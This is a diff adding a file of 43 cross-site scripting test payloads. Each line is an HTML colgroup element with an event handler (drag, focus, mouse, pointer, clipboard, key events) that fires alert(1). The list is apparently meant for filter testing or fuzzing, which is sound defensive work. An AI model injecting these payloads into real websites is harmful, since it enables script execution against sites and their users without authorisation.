@@ -1,0 +1,43 @@
+<colgroup draggable="true" ondrag="alert(1)">test</colgroup>
+<colgroup draggable="true" ondragend="alert(1)">test</colgroup>
+<colgroup draggable="true" ondragenter="alert(1)">test</colgroup>
+<colgroup draggable="true" ondragleave="alert(1)">test</colgroup>
+<colgroup draggable="true" ondragstart="alert(1)">test</colgroup>
+<colgroup id=x tabindex=1 onactivate=alert(1)></colgroup>
+<colgroup id=x tabindex=1 onbeforeactivate=alert(1)></colgroup>
+<colgroup id=x tabindex=1 onbeforedeactivate=alert(1)></colgroup><input autofocus>
+<colgroup id=x tabindex=1 ondeactivate=alert(1)></colgroup><input id=y autofocus>
+<colgroup id=x tabindex=1 onfocus=alert(1)></colgroup>
+<colgroup id=x tabindex=1 onfocusin=alert(1)></colgroup>
+<colgroup onafterscriptexecute=alert(1)><script>1</script>
+<colgroup onbeforecopy="alert(1)" contenteditable>test</colgroup>
+<colgroup onbeforecut="alert(1)" contenteditable>test</colgroup>
+<colgroup onbeforepaste="alert(1)" contenteditable>test</colgroup>
+<colgroup onbeforescriptexecute=alert(1)><script>1</script>
+<colgroup onblur=alert(1) tabindex=1 id=x></colgroup><input autofocus>
+<colgroup onclick="alert(1)">test</colgroup>
+<colgroup oncontextmenu="alert(1)">test</colgroup>
+<colgroup oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<colgroup oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<colgroup ondblclick="alert(1)" autofocus tabindex=1>test</colgroup>
+<colgroup onfocusout=alert(1) tabindex=1 id=x></colgroup><input autofocus>
+<colgroup onkeydown="alert(1)" contenteditable>test</colgroup>
+<colgroup onkeypress="alert(1)" contenteditable>test</colgroup>
+<colgroup onkeyup="alert(1)" contenteditable>test</colgroup>
+<colgroup onmousedown="alert(1)">test</colgroup>
+<colgroup onmouseenter="alert(1)">test</colgroup>
+<colgroup onmouseleave="alert(1)">test</colgroup>
+<colgroup onmousemove="alert(1)">test</colgroup>
+<colgroup onmouseout="alert(1)">test</colgroup>
+<colgroup onmouseover="alert(1)">test</colgroup>
+<colgroup onmouseup="alert(1)">test</colgroup>
+<colgroup onmousewheel=alert(1)>requires scrolling
+<colgroup onpaste="alert(1)" contenteditable>test</colgroup>
+<colgroup onpointerdown=alert(1)>XSS</colgroup>
+<colgroup onpointerenter=alert(1)>XSS</colgroup>
+<colgroup onpointerleave=alert(1)>XSS</colgroup>
+<colgroup onpointermove=alert(1)>XSS</colgroup>
+<colgroup onpointerout=alert(1)>XSS</colgroup>
+<colgroup onpointerover=alert(1)>XSS</colgroup>
+<colgroup onpointerrawupdate=alert(1)>XSS</colgroup>
+<colgroup onpointerup=alert(1)>XSS</colgroup>
